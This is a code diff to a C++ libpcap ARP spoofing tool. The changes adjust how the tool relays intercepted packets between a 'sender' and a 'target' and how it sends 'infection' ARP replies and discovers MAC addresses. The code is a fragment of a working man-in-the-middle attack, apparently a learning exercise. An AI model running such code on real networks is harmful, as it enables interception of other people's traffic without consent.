@@ -129,7 +129,7 @@ void send_infect_arp(const u_int8_t *pkt_data, u_int8_t chk_first)
        cout<< "SEND_INFECTION_ARP!\n"<<endl;
     }
 
-
+    // sender OR target Timeout Broadcast
     if( (!(memcmp(eh->src_mac,sender_mac,6))) || (!(memcmp(eh->src_mac,target_mac,6))) )
     {
         memcpy(packet,&m_S,PKT_SIZE);
@@ -152,16 +152,19 @@ void send_infect_arp(const u_int8_t *pkt_data, u_int8_t chk_first)
 void pkt_relay(const u_int8_t *pkt_data,bpf_u_int32 caplen)
 {
     struct eth_header *eh;
+    struct ip_header *ih;
     eh = (struct eth_header *)pkt_data;
+    ih = (struct ip_header *)(pkt_data+sizeof(struct eth_header));
 
-        if(!(memcmp(eh->src_mac,sender_mac,sizeof(eh->src_mac))))
+        // IP try-catch
+        if(!(memcmp(eh->src_mac,sender_mac,sizeof(eh->src_mac))) && !(ih->ip_des_add.s_addr==my_ip.sin_addr.s_addr) )
         {
             cout << "Sender PKT IN ::"<<endl;
             memcpy(eh->src_mac,my_mac.ether_addr_octet,sizeof(eh->src_mac));
             memcpy(eh->des_mac,target_mac,sizeof(eh->des_mac));
-
         }
-        if(!(memcmp(eh->src_mac,target_mac,sizeof(eh->src_mac))))
+
+        if(!(memcmp(eh->src_mac,target_mac,sizeof(eh->src_mac))) && (ih->ip_des_add.s_addr==G_Sender_ip.sin_addr.s_addr))
         {
             cout << "Target PKT IN ::"<<endl;
             memcpy(eh->src_mac,my_mac.ether_addr_octet,sizeof(eh->src_mac));
@@ -176,7 +179,7 @@ void init_dev(char *dev_name)
     char errbuf[ERRBUF_SIZ];
     struct bpf_program rule_struct;
 
-    if((use_dev=pcap_open_live(dev_name,SNAPLEN,1,1000,errbuf))==NULL)
+    if((use_dev=pcap_open_live(dev_name,SNAPLEN,1,1,errbuf))==NULL)
     {
         err_print(1);
         exit(1);
@@ -206,7 +209,7 @@ void find_mac(const uint8_t *pkt_data,char *sender_ip,char *target_ip)
     inet_aton(sender_ip,&sender.sin_addr);
     inet_aton(target_ip,&target.sin_addr);
 
-    if(ah->s_ip.s_addr == sender.sin_addr.s_addr)
+    if(!find_chk_S && ah->s_ip.s_addr == sender.sin_addr.s_addr)
     {
         memcpy(sender_mac,ah->s_mac,sizeof(ah->s_mac));
 
@@ -217,7 +220,7 @@ void find_mac(const uint8_t *pkt_data,char *sender_ip,char *target_ip)
         find_chk_S = 1;
     }
 
-    if(ah->s_ip.s_addr == target.sin_addr.s_addr)
+    if(!find_chk_T && ah->s_ip.s_addr == target.sin_addr.s_addr)
     {
         memcpy(target_mac,ah->s_mac,sizeof(ah->s_mac));
 
@@ -231,7 +234,7 @@ void find_mac(const uint8_t *pkt_data,char *sender_ip,char *target_ip)
     if(find_chk_S && find_chk_T) send_infect_arp(pkt_data,1);
 }
 
-void find_me(char *dev_name)
+void find_me(char *dev_name) // Find_Me return value -> true / false
 {
     FILE *ptr;
     char MAC[20];
